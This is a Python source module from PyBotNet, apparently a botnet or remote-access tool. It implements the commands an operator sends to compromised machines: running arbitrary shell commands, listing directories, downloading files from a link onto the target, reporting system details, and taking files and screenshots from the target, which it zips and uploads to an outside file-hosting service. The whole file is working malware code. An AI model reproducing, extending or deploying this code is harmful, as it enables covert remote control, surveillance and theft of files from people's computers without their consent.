'''Defult PyBotNet scripts'''
import re
import os
import subprocess

from logging import exception
from time import sleep

from uuid import getnode as get_system_mac_addres
from requests import get

# pybotnet import
from . import util
from . import settings
mac_addres = str(get_system_mac_addres())

scripts_name = {
    mac_addres: "`<system mac_addres> <command>`: run command on one target",

    "do_sleep": "`do_sleep <scconds> <message>`: print message and sleep",

    "get_info": "`get_info`: get target info",

    "cmd": "`cmd <command>`: run command in target terminal",

    "ls": "`ls <route>`: Return a list of folders and files in that path",

    "export_file": "`export_file <download link>`: target donwload this file and save to script path",

    "import_file": "`import_file <file route>`: get a file from target system",

    "screenshot":  "`screenshot`: Takes a screenshot, return the download link",

    "help": "`help`: send this message",

    "/start": "`/start`: run `help` command!"
}

# "import_file": "import_file <route>"


def split_command(command: str) -> list:
    '''split string by space'''
    return command.split(' ')


def get_command_name(command: str) -> str:
    '''get first arg'''
    return split_command(command)[0]


def is_command(command) -> bool:
    command_name = get_command_name(command)
    if command_name in scripts_name:
        return True
    return False


def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
    command_name = get_command_name(command)
    try:
        if is_command(command):

            if command_name == mac_addres:
                '''run command just in this system'''
                logger.info('delete mac addres and run command ')
                new_command = ' '.join(split_command(command)[1:])
                return execute_scripts(new_command, pybotnet_up_time, logger)

            elif command_name == 'do_sleep':
                return execute_do_sleep(command, logger)

            elif command_name == 'get_info':
                return get_info(pybotnet_up_time, logger)

            elif command_name == 'cmd':
                return execute_cmd(command, is_shell, logger)

            elif command_name == 'ls':
                return execute_ls(command, logger)

            elif command_name == 'export_file':
                return execute_download_manager(command, logger)

            elif command_name == 'import_file':
                return execute_upload_manager(command, logger)

            elif command_name == 'screenshot':
                return screenshot(logger)

            elif command_name in ['help', '/start']:
                return command_help(logger)

        logger.error('execute_scripts invalid command; Wrong format')
        return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"

    except exception as error:
        return f'execute_scripts error: {error}'


def execute_do_sleep(command, logger):
    command = split_command(command)
    try:
        sleep_message = command[2:]
        sleep_message = ' '.join(sleep_message)
    except:
        sleep_message = ''

    try:
        do_sleep(seconds=command[1], logger=logger,
                 sleep_message=sleep_message)
        logger.info('do_sleep done')
        return 'do_sleep done'
    except OverflowError as error_name:
        logger.error(f'do_sleep {error_name}')

    except exception as error:
        logger.error(
            f'execute_do_sleep invalid command; Wrong format, error: {error}')
        return f'execute_do_sleep invalid command; Wrong format, error: {error}'


def do_sleep(seconds, logger, sleep_message: str):
    '''
    print sleep message and sleep
    '''
    if sleep_message != '':
        print(sleep_message)

    logger.info(f'sleep {seconds} second | {sleep_message}')
    sleep(float(seconds))
    logger.info('sleep done')


def get_info(pybotnet_up_time, logger):
    logger.info('return system info')
    return util.get_full_system_info(pybotnet_up_time)


def execute_cmd(command, is_shell: bool, logger) -> str:
    try:
        command = split_command(command)
        # command = ' '.join(command[1:])
        command = command[1:]

    except exception as error:
        return f'execute_cmd invalid command; Wrong format: {error}'

    try:
        return cmd(command, is_shell, logger=logger)

    except OverflowError as error:
        return f'cmd {error}'
    except exception as error:
        return f'cmd error: {error}'


# def cmd(command: list, is_shell: bool,  logger) -> str:
#     '''command sample: makedir newfolder'''
#     # TODO: add timeout

#     logger.info(f'try to run: {command}')

#     output = subprocess.run(command, shell=True, capture_output=True)

    # output = str(output).replace('\\r\\n', '\n')  # cleaning data
    # output = str(output).replace('\\n', '\n')
#     output = str(output).replace("b'", '')
    # output = output[2:]  # remove b'
#     return output

def clean_shell_data(output):
    output = str(output).replace('\\r\\n', '\n')  # cleaning data
    output = str(output).replace('\\n', '\n')
    output = str(output).replace("b'", '')
    return output


def cmd(command: list, is_shell: bool, logger):
    '''if you compile app on noconsloe mod make is_shell False'''

    logger.info(f'try to run: {command}')

    outputFileName = 'data.txt'

    if not is_shell:

        os_result = os.system(' '.join(command))
        return f'''output code {os_result} \n\nyou compile app noconsole (is_shell = False), That\'s why I can\'t get the output text by `cmd` command
        (for get directory list use `ls` command, like : `ls /home`)'''

        # # this a bug (if compile code on noconsole i can get stdout ..):
        # with open(outputFileName, "w") as outputFile:
        #     result = subprocess.call(
        #         command, shell=True, stdout=outputFile, stderr=subprocess.STDOUT)

        # with open(outputFileName, "r") as outputFile:
        #     file_data = outputFile.readlines()
        #     result = f'{file_data} \n\nreturn code {result}'
        #     outputFile.close()
        # os.remove(outputFileName)
        # return clean_shell_data(result)

    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        proc.stdin.close()
        proc.wait()
        result = f'{proc.stdout.read()}\n\nreturn code {proc.returncode}'
        return clean_shell_data(result)


def execute_ls(command, logger) -> str:
    command = split_command(command)

    logger.info(f'execute ls: {command}')

    try:
        return ls(command[1])
    except exception as error:
        return f'execute_ls error: {error} '


def ls(route: str) -> str:
    try:
        return os.listdir(route)

    except FileNotFoundError as error:
        return f'ls {error}'
    except exception as error:
        return f'ls Unknown error: {error}'


def execute_download_manager(command: str, logger):
    '''run download_manager function'''
    command = split_command(command)

    try:
        down_link = command[1]
        file_name = re.findall(r'.*/(.*)$', down_link)
        file_name = (file_name[0])

        logger.info(
            f'execute_download_manager download_link: {down_link}, file name: {file_name}')

        res = download_manager(down_link, file_name)
        if res:
            return f'file download and save; \n\nfrom:\n{down_link} \n\nfile name:\n{file_name} \n\n route:\n{os.getcwd()}'
        return f'download False {down_link}'

    except IndexError as error:
        logger.info(
            f'execute_download_manager wrong format ;need download link for execute_download_manager; error:{error}')
        return f'i need download link for execute_download_manager; error:{error}'

    except exception as error:
        logger.info(
            f'execute_download_manager; error:{error}')
        return f'execute_download_manager error:{error}'


def download_manager(down_link: str, file_name: str) -> bool:
    '''Download Manager'''
    try:
        req = get(down_link)

        with open(file_name, "wb") as code:
            code.write(req.content)
        return True

    except:
        return False


def execute_upload_manager(command: str, logger):
    '''execute import_file <file route>'''
    command = split_command(command)

    try:
        route = command[1]
        return upload_manager(route, logger)[1]
    except Exception as error:
        logger.error(f'execute_upload_manager: {error}')
        return 'bad format'


def upload_manager(file_route: str, logger):
    '''zip file and upload to up.ufile.io and return link,..'''
    is_true, zip_file_name = util.make_zip_file(file_route, logger)

    if is_true:
        try:
            # open zip file and read binary
            with open(zip_file_name, 'rb') as file:
                binary_file = file.read()
                is_true, download_data = util.upload_server_1(
                    binary_file, zip_file_name, logger)
            try:
                # remove zip file
                os.remove(zip_file_name)
            except Exception as error:
                logger.error('script.upload_manager.remove file error!')

            if is_true:
                # if uploada True
                logger.info(f'{zip_file_name} file uploaded')
                return True, download_data

            return False, 'Upload Failed'

        except Exception as error:
            logger.error(f'upload_manager: {error}')
            return False, 'Upload Failed'
    return False, 'file not found'


def screenshot(logger):
    ''' get screenshot and return screenshot download link '''
    screen_file_route = util.screenshot_pil(logger)

    if screen_file_route:
        try:
            # open png file and read binary
            with open(screen_file_route, 'rb') as file:
                binary_file = file.read()
                is_true, download_data = util.upload_server_1(
                    binary_file, screen_file_route, logger, time_out=120, file_type='png')
            try:
                # remove png file
                os.remove(screen_file_route)
            except Exception as error:
                logger.error(
                    'script.upload_manager.remove  screenshot file error!')

            if is_true:
                # if upload True
                logger.info('screenshot uploaded.')
                return download_data
            else:
                return 'Upload screenshot Failed'
        except Exception as error:
            logger.error(f'scripts.screenshot.upload_manager: {error}')
            return f'Upload Failed: \nupload_manager Exception:{error}'
    else:
        logger.error('script.screenshot in util.screenshot_pil Failed')
        return 'get screenshot Failed'


def command_help(logger):
    commands = ''
    try:
        for _, value in scripts_name.items():
            commands += '\n\n|' + value
        logger.info(f'scripts.command_help: return command lists')
        return f'''command list:
{commands}

Version: {settings.pybotnet_version}
more help: {settings.pybotnet_github_link}'''

    except Exception as error:
        logger(f'scripts.command_help: error {error}')
        return f'''
_____________
get command list failed!,
_____________

Pybotnet Version:{settings.pybotnet_version}
for more help, see: {settings.pybotnet_github_link}'''
